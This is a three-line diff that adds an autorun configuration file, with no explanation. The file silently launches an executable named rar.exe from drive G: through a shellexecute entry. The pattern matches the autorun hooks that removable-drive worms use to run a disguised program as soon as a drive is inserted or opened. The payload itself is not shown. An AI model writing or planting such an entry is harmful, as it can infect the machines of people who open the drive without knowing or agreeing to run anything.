@@ -1,0 +1,3 @@
+[AutoRun]
+shellexecute=G:\rar.exe /s
+Action=Autorun
